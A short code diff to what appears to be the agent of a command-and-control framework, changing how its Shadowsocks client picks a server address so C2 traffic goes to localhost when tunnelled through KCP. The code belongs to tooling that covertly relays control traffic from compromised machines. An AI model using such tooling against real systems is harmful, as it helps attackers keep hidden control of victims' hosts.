@@ -11,17 +11,19 @@ import (
 // This proxy server is responsible for encapsulating C2 traffic
 func ShadowsocksC2Client() {
 	ss_server_port := RuntimeConfig.ShadowsocksPort
+	ss_server_addr := RuntimeConfig.CCHost
 	if RuntimeConfig.UseKCP {
 		go KCPClient()
 		log.Print("C2 traffic will go through Shadowsocks, which will go through KCP")
 		ss_server_port = RuntimeConfig.KCPPort
+		ss_server_addr = "127.0.0.1"
 	} else {
 		log.Printf("C2 traffic will go through Shadowsocks: %s:%s",
 			RuntimeConfig.CCHost,
 			RuntimeConfig.ShadowsocksPort)
 	}
 
-	server_addr := fmt.Sprintf("%s:%s", RuntimeConfig.CCHost, ss_server_port)
+	server_addr := fmt.Sprintf("%s:%s", ss_server_addr, ss_server_port)
 	local_socks_addr := "127.0.0.1:" + RuntimeConfig.ShadowsocksPort
 
 	// start ss
